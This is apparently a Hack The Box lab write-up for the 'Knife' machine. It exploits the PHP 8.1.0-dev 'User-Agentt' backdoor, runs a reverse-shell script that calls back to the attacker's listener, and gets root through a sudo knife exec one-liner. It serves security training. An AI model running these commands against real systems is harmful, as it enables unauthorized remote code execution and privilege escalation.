---
title: Knife
date: 2025-12-29 19:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, knife ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/110fe6608793064cf171080150ebd0dc.png
    alt: Hack The Box
---

> Knife
Linux · Easy 

## Task 1

How many TCP ports are open on Knife?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sCVS -T 5 --min-rate 5000 10.129.28.20 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-29 19:25 CET
Warning: 10.129.28.20 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.28.20
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.01 seconds
```

> 2

## Task 2

What version of PHP is running on the webserver?

```shell
┌──(pmartinezr㉿kali)-[~]
└─$ curl -I 10.129.28.20                         
HTTP/1.1 200 OK
Date: Mon, 29 Dec 2025 18:27:35 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

> 8.1.0-dev

## Task 3

What HTTP request header can be added to get code execution in this version of PHP?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ searchsploit 8.1.0-dev                          

------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                      | php/webapps/49933.py
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> User-Agentt

## Task 4

What user is the web server running as?

[https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py)

``` shell
┌──(pmartinezr㉿kali)-[~/htb/knife]
└─$ python backdoor_php_8.1.0-dev.py
Enter the host url:
http://10.129.28.20/

Interactive shell is opened on http://10.129.28.20/ 
Can't acces tty; job crontol turned off.
$ whoami
james
```

## Submit User Flag

Submit the flag located in the james user's home directory.

```shell
$ cat /home/james/user.txt
e5d63ef5f4fc9ebf************
```

> e5d63ef5f4fc9ebf************

## Task 6

What is the full path to the binary on this machine that james can run as root?

``` shell
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

> /usr/bin/knife

## Submit Root Flag

Submit the flag located in root's home directory.


``` shell
┌──(pmartinezr㉿kali)-[~/htb/knife]
└─$ python revshell_php_8.1.0-dev.py http://10.129.28.20 10.10.14.110 4444

```

Como el shell que conseguimos es muy limitado opto por utilizar el script de revershell

``` shell
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.110:4444 
[*] Command shell session 1 opened (10.10.14.110:4444 -> 10.129.28.20:40414) at 2025-12-29 20:17:05 +0100


Shell Banner:
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
-----        

james@knife:/$ 
```

Tenemos una shell ya solo falta elevar privilegios

Invetigo un poco este binario que desconocía [https://gtfobins.github.io/gtfobins/knife/](https://gtfobins.github.io/gtfobins/knife/)
[https://manpages.ubuntu.com/manpages/trusty/man1/knife.1.html](https://manpages.ubuntu.com/manpages/trusty/man1/knife.1.html)

``` shell
james@knife:/usr/bin$ sudo /usr/bin/knife exec -E 'exec "/usr/bin/bash"'
sudo /usr/bin/knife exec -E 'exec "/usr/bin/bash"'
root@knife:/usr/bin# cat /root/root.txt
cat /root/root.txt
2f795fc2f319628b0************
```

> 2f795fc2f319628b0************


[achivement](https://labs.hackthebox.com/achievement/machine/2336390/347)


